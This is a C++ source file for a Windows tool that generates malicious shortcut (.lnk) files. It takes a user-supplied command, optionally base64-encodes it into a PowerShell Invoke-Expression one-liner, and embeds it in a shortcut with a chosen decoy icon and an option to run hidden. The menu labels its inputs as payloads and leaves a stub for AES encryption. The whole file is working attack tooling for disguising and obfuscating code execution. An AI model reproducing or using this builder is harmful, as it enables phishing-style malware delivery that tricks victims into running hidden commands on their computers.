#include <iostream>
#include <string>
#include <sstream>
#include <windows.h>
#include <shobjidl.h>
#include <shlguid.h>
#include <objbase.h>
#include <fstream>
#include <filesystem>
#include <chrono>
#include <iomanip>
#include "base64.hpp"

bool fileExists(const std::wstring& path) {
    return std::filesystem::exists(path);
}

std::wstring inputValidatedPath(const std::wstring& prompt, bool mustExist = true) {
    std::wstring input;
    do {
        std::wcout << prompt;
        std::getline(std::wcin, input);
        if (input.empty()) {
            std::wcout << L"Input cannot be empty.\n";
            continue;
        }

        // Convert relative path to absolute using current path
        if (!std::filesystem::path(input).is_absolute()) {
            input = std::filesystem::absolute(input).wstring();
        }

        if (mustExist && !fileExists(input)) {
            std::wcout << L"File does not exist. Try again.\n";
            continue;
        }
        break;
    } while (true);
    return input;
}

std::wstring inputLine(const std::wstring& prompt, bool allowEmpty = false) {
    std::wstring input;
    do {
        std::wcout << prompt;
        std::getline(std::wcin, input);
        if (!allowEmpty && input.empty()) {
            std::wcout << L"Input cannot be empty.\n";
            continue;
        }
        break;
    } while (true);
    return input;
}

std::wstring b64_encoding() {
    std::string line;
    std::ostringstream input_buffer;

    std::cout << "Enter your text (multi-line). Type END on a new line to finish:\n";
    while (true) {
        std::getline(std::cin, line);
        if (line == "END") break;
        input_buffer << line << '\n';
    }

    std::string full_input = input_buffer.str();
    if (!full_input.empty() && full_input.back() == '\n') {
        full_input.pop_back();  // remove trailing newline
    }

    auto encoded_str = base64::to_base64(full_input);
    std::cout << "\nBase64 encoded:\n" << encoded_str << std::endl;

    // Construct PowerShell command (as wstring, escaped)
    std::wstring powershellCommand = L"-Command \"Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('";
    powershellCommand += std::wstring(encoded_str.begin(), encoded_str.end());
    powershellCommand += L"')))\"";

    std::wcout << L"\nGenerated PowerShell Command:\n" << powershellCommand << std::endl;
    return powershellCommand;
}

std::wstring getTimestampedFilename(const std::wstring& baseName, const std::wstring& ext) {
    auto now = std::chrono::system_clock::now();
    std::time_t now_c = std::chrono::system_clock::to_time_t(now);
    std::tm tm{};
    localtime_s(&tm, &now_c);

    std::wstringstream ss;
    ss << baseName << L"_" << std::put_time(&tm, L"%Y%m%d_%H%M") << ext;
    return ss.str();
}

void lnk_file_generator(const std::wstring& args = L"") {
    CoInitialize(nullptr); // COM init

    IShellLinkW* pShellLink = nullptr;
    IPersistFile* pPersistFile = nullptr;

    std::wcout << L"=== Shortcut Creator ===\n";

    std::wstring path = inputValidatedPath(L"Enter full path to target executable (SetPath): ");
    std::wstring workDir = inputLine(L"Enter working directory (SetWorkingDirectory): ");
    std::wstring iconPath = inputValidatedPath(L"Enter path to icon (.ico/.exe/.dll) (SetIconLocation): ");
    std::wcout << L"Enter icon index (e.g., 0 = default, 1 = second icon, etc.): ";
    int iconIndex;
    std::wcin >> iconIndex;
    std::wcin.ignore(); // flush newline from buffer

    std::wstring defaultShortcut = getTimestampedFilename(L"CreateShortcut", L".lnk");
    std::wcout << L"Default output shortcut path: " << defaultShortcut << L"\n";
    std::wstring shortcutPath = inputLine(L"Enter output shortcut file path or press Enter to use default: ", true);
    if (shortcutPath.empty()) {
        shortcutPath = defaultShortcut;
    }

    std::wcout << L"Choose how the shortcut should run:\n";
    std::wcout << L"1. Normal\n2. Minimized\n3. Maximized\n4. Hidden (SW_HIDE + SW_SHOWMINNOACTIVE)\n";
    int showOption;
    std::wcin >> showOption;
    std::wcin.ignore();

    int showCmd = SW_SHOWNORMAL;
    switch (showOption) {
        case 2: showCmd = SW_SHOWMINNOACTIVE; break;
        case 3: showCmd = SW_SHOWMAXIMIZED; break;
        case 4: showCmd = SW_HIDE | SW_SHOWMINNOACTIVE; break;
        default: break;
    }

    HRESULT hr = CoCreateInstance(CLSID_ShellLink, nullptr, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&pShellLink);
    if (SUCCEEDED(hr)) {
        pShellLink->SetPath(path.c_str());
        if (!args.empty()) pShellLink->SetArguments(args.c_str());
        pShellLink->SetWorkingDirectory(workDir.c_str());
        pShellLink->SetIconLocation(iconPath.c_str(), iconIndex);
        pShellLink->SetShowCmd(showCmd);

        hr = pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);
        if (SUCCEEDED(hr)) {
            hr = pPersistFile->Save(shortcutPath.c_str(), TRUE);
            if (SUCCEEDED(hr)) {
                std::wcout << L"Shortcut created successfully!\n";
            } else {
                std::wcout << L"Failed to save shortcut.\n";
            }
            pPersistFile->Release();
        } else {
            std::wcout << L"Failed to get IPersistFile.\n";
        }
        pShellLink->Release();
    } else {
        std::wcout << L"Failed to create IShellLink instance.\n";
    }

    CoUninitialize();
}

int main() {
    int option;

    std::cout << "1. Plaintext payload\n";
    std::cout << "2. Payload encoded with b64\n";
    std::cout << "3. Payload encoded and encrypted with B64+AES256\n";
    std::cout << "0. Exit\n";

    do {
        std::cout << "Choose option: ";
        std::cin >> option;
    } while (option < 0 || option > 3);

    switch (option) {
        case 1: {
            std::cout << "Enter the command you want to run directly (no encoding):\n";
            std::cin.ignore(); // clear leftover newline
            std::string rawCommand;
            std::getline(std::cin, rawCommand);
            std::wstring wRawCommand(rawCommand.begin(), rawCommand.end());
            lnk_file_generator(wRawCommand);
            break;
        }

        case 2: {
            std::wstring encodedCommand = b64_encoding();
            lnk_file_generator(encodedCommand);
            break;
        }

        case 3: {
            std::wstring encodedCommand = b64_encoding();
            // You can plug AES here in future
            lnk_file_generator(encodedCommand);
            break;
        }

        case 0:
            break;
    }

    return 0;
}
